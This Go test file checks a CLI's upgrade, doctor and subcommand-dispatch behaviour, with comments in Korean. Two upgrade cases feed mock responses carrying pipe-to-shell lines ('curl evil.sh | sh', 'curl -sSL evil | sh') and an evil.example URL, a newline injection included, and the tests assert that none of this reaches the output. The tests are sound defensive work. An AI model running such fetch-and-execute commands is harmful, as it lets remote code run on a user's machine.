package cli

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/wotjr1649/context-router/internal/ident"
)

// TestRunUpgrade_Table: httptest 서버로 정상/오류/타임아웃/위생검증 경로를 모두 확인한다
// (설계 §7 — upgrade 위생: 응답 제공 URL·기타 필드는 절대 출력 금지, tag_name만 취함).
func TestRunUpgrade_Table(t *testing.T) {
	tests := []struct {
		name       string
		handler    http.HandlerFunc
		clientTO   time.Duration
		wantOut    string
		notContain []string
	}{
		{
			name: "ok_two_lines_plus_install",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.2.3"}`))
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\nlatest: v1.2.3\ninstall: download from the project releases page and replace the binary\n",
		},
		{
			name: "non_200_falls_back_to_current_only",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\n",
		},
		{
			name: "malicious_tag_name_rejected_by_sanitization",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.0\nmalicious: curl evil.sh | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\n",
			notContain: []string{"malicious", "curl"},
		},
		{
			name: "response_provided_fields_never_leak",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v9.9.9","html_url":"http://evil.example/pwned","upgrade_command":"curl -sSL evil | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\nlatest: v9.9.9\ninstall: download from the project releases page and replace the binary\n",
			notContain: []string{"evil.example", "curl -sSL", "pwned"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(tt.handler)
			defer srv.Close()
			var buf bytes.Buffer
			client := &http.Client{Timeout: tt.clientTO}
			if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
				t.Fatalf("err=%v want nil", err)
			}
			got := buf.String()
			if got != tt.wantOut {
				t.Fatalf("out=%q want %q", got, tt.wantOut)
			}
			for _, s := range tt.notContain {
				if strings.Contains(got, s) {
					t.Fatalf("out=%q must not contain %q", got, s)
				}
			}
		})
	}

	// 타임아웃: 핸들러가 느리게 응답하고 client.Timeout을 매우 짧게 주입한다. 경과시간으로
	// 실제 10s(운영 상수)를 기다리지 않았음을 증명한다 — 인젝션된 client가 근거.
	t.Run("timeout_falls_back_to_current_only", func(t *testing.T) {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(300 * time.Millisecond)
			w.Write([]byte(`{"tag_name":"v1.2.3"}`))
		}))
		defer srv.Close()
		var buf bytes.Buffer
		client := &http.Client{Timeout: 30 * time.Millisecond}
		start := time.Now()
		if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
			t.Fatalf("err=%v want nil", err)
		}
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Fatalf("took %v — suspiciously long, real 10s constant may have been used instead of injected client", elapsed)
		}
		want := "current: v0.0.1-dev\n"
		if buf.String() != want {
			t.Fatalf("out=%q want %q", buf.String(), want)
		}
	})
}

// TestRunDoctor_Smoke: 미생성 storeRoot(부모만 존재) + 임시 프로젝트 디렉터리로 doctor를
// 실행한다. content.db가 없으므로 "not initialized"가 나와야 하고, err=nil이어야 하며,
// doctor는 store를 생성하면 안 된다(no-create, 설계 §7) — storeRoot 자체도, 프로젝트별
// store 디렉터리도 실행 후 여전히 존재하지 않아야 한다.
func TestRunDoctor_Smoke(t *testing.T) {
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot") // 의도적 미생성 — 부모(base)만 존재
	projectRoot := filepath.Join(base, "proj")
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, canon.ProjectID) {
		t.Fatalf("out missing ProjectID %q: %s", canon.ProjectID, out)
	}
	if !strings.Contains(out, "not initialized") {
		t.Fatalf("out missing 'not initialized': %s", out)
	}
	if !strings.Contains(out, ".mcp.json") {
		t.Fatalf("out missing '.mcp.json' snippet marker: %s", out)
	}

	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", canon.ProjectID)); !os.IsNotExist(err) {
		t.Fatalf("per-project store dir must not be created by doctor: stat err=%v", err)
	}
}

// TestRun_UnknownSub: cli의 관심사가 아닌 미지 서브커맨드는 오류를 반환해야 한다 — main이
// 이를 통해 미지 단어를 MCP 플래그로 잘못 흡수하지 않도록 한다(설계 §7).
func TestRun_UnknownSub(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "bogus", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unknown subcommand, got nil")
	}
}

// TestRun_NotYetImplementedSubs: stats/purge는 Task4/5 소관이지만 dispatch 자체는 지금
// 4개 이름을 모두 인식해야 한다 — 명확한 "미구현" 오류를 반환한다(어떤 이름도 삼켜지지 않음).
func TestRun_NotYetImplementedSubs(t *testing.T) {
	for _, sub := range []string{"stats", "purge"} {
		var out, errOut bytes.Buffer
		err := Run(context.Background(), sub, nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
		if err == nil {
			t.Fatalf("sub=%s: want error (not yet implemented), got nil", sub)
		}
	}
}
